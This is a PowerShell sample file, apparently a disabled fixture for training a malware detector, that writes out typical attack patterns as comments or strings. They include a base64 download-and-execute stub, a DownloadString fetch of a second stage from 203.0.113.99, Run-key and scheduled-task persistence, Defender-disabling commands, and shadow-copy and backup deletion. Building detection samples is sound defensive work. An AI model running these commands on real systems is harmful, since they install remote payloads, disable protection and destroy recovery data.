# SAMPLE FILE FOR ANALYSIS PRACTICE - INTENTIONALLY INERT
# Every dangerous call below is COMMENTED OUT. This script only prints a message.
# It exists so the Malware Analyzer has realistic patterns to detect.

$ErrorActionPreference = "SilentlyContinue"
Write-Host "This is a harmless sample used by the CyberSafe platform for training."

# --- obfuscation patterns (inert) -------------------------------------------
$a = "aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkA"
$b = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($a))
# Invoke-Expression $b            # <-- disabled

$parts = "Down" + "load" + "String"
$u1 = "htt" + "p://" + "203.0.113.99" + "/stage2.ps1"
# (New-Object Net.WebClient).$parts($u1)      # <-- disabled

# --- persistence (inert) -----------------------------------------------------
# New-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" `
#   -Name "Updater" -Value "C:\Windows\Temp\svchost32.exe"
# schtasks /create /sc minute /mo 5 /tn "WinUpdateHelper" /tr "C:\Windows\Temp\svchost32.exe"

# --- defense evasion (inert) -------------------------------------------------
# Set-MpPreference -DisableRealtimeMonitoring $true
# Add-MpPreference -ExclusionPath "C:\Windows\Temp"

# --- destructive (inert) -----------------------------------------------------
# vssadmin delete shadows /all /quiet
# wbadmin delete catalog -quiet
# bcdedit /set {default} recoveryenabled No

# --- injection API references (strings only) ---------------------------------
$apis = @("VirtualAllocEx","WriteProcessMemory","CreateRemoteThread","SetThreadContext")

Write-Host "Sample complete. Nothing was executed."
